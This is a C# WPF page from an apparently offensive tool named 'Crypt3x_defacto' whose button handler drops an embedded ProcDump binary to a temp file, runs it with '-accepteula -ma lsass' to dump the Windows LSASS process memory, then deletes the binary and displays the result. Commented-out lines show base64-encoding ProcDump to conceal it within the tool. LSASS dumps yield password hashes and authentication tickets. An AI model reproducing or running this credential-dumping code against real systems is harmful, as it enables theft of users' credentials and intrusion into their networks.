using System.IO;
using System.Threading.Tasks;
using System.Windows.Controls;

namespace Crypt3x_defacto {
	/// <summary>
	/// Interaction logic for DumpLSASS.xaml
	/// </summary>
	public partial class DumpLSASS : Page {
		public DumpLSASS() {
			InitializeComponent();
			//File.WriteAllText("procdump_encoded.txt", Helper.Base64FileCompressor.FileToBase64("procdump.exe"));
		}

		private string procdump() {
			//Helper.MemoryScanner.dump("Crypt3x-defacto");

			/*var filepath = Helper.Base64FileCompressor.Base64ToFile(Helper.Executables.ProcDump);
			var output = string.Join("\n", Helper.Executables.runCMD(filepath, "-accepteula -ma lsass"));
			try { File.Delete(filepath); } catch { }
			return output;*/
			
			var filepath = Path.GetTempFileName();
			File.WriteAllBytes(filepath, Properties.Resources.ProcDump);
			var output = string.Join("\n", Helper.Functions.runCMD(filepath, "-accepteula -ma lsass"));
			try { File.Delete(filepath); } catch { }
			return output;
		}
		
		async private void start_button_Click(object sender, System.Windows.RoutedEventArgs e) {
			start_button.IsEnabled = false;
			status.Text = "";
            var output = await Task.Run(() => procdump());            
			status.Text = output;
			start_button.IsEnabled = true;
		}
	}
}
